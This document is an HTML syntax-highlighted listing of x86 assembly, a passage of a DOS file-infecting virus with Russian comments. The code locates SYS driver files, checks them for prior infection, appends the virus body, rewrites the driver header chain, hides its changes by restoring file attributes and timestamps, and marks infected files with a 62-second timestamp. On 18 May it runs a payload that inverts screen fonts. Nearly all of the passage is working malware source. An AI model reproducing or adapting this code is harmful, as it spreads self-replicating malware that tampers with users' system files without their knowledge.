        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Найден каталог или метка тома?]</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">


</span><span class="sc1">;[Проверяем файл на зараженность]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">Quit</span><span class="sc0">


</span><span class="sc1">;[Ищем конец имени файла]</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">FindZero</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FindZero</span><span class="sc0">


</span><span class="sc1">;[Это SYS-файл?]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z.'</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'S.'</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFh</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZZ'</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'SY'</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Quit</span><span class="sc0">


</span><span class="sc1">;[Заражаем файл]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем старый обработчик Int 24h]</span><span class="sc0">

</span><span class="sc5">Quit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">QuitCLC</span><span class="sc0">


</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Сохраняем атрибуты файла]</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Return</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        

</span><span class="sc1">;[Обнуляем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">


</span><span class="sc1">;[Открываем файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Сохраняем дату и время создания файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;[Считываем первые 4 байта заголовка]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Проверяем тип файла]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">DriverOk</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">DriverOk</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Восстанавливаем дату и время создания файла]</span><span class="sc0">

</span><span class="sc5">RestTime</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем атрибуты файла]</span><span class="sc0">

</span><span class="sc5">RestAttr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">

</span><span class="sc5">Return</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Устанавливаем указатель на 7 позиций от конца файла]</span><span class="sc0">

</span><span class="sc5">DriverOk</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF9h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Считываем 7 байт]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XXXNS</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель в конец файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Проверяем, чтобы файл с вирусом занимал не более 64Kb]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">-(</span><span class="sc5">EndCode</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Вычиляем поля заголовка SYS-файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">NextDriver</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">NextDriver</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Strategy</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Interrupt</span><span class="sc4">-</span><span class="sc5">Strategy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Записываем новый заголовок в конец файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Этот файл - XXXNS?]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndCode</span><span class="sc4">-</span><span class="sc2">7</span><span class="sc4">-</span><span class="sc5">Strategy</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">XXXNS</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SN'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">XXXNS</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">EndCode</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EndCode</span><span class="sc4">-</span><span class="sc5">Strategy</span><span class="sc0">


</span><span class="sc1">;[Записываем вирус в конец файла]</span><span class="sc0">

</span><span class="sc5">L1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Strategy</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeA</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель в начало файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeA</span><span class="sc0">


</span><span class="sc1">;[Записываем адрес заголовка вируса]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">NextDriver</span><span class="sc4">-</span><span class="sc5">Entry</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeA</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем время создания файла - 62 секунды]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">00011111b</span><span class="sc0">


</span><span class="sc1">;[Проверяем системную дату]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0807h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1805h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RestTimeA</span><span class="sc0">


</span><span class="sc1">;[Если сегодня 18.05.xx, то инвертируем шрифты]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1130h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">L2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">L3</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">L4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">*</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">L2</span><span class="sc0">

</span><span class="sc5">L4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1104h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">RestTimeA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">XXXNS</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">EndCode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Pointer</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NextDriver</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
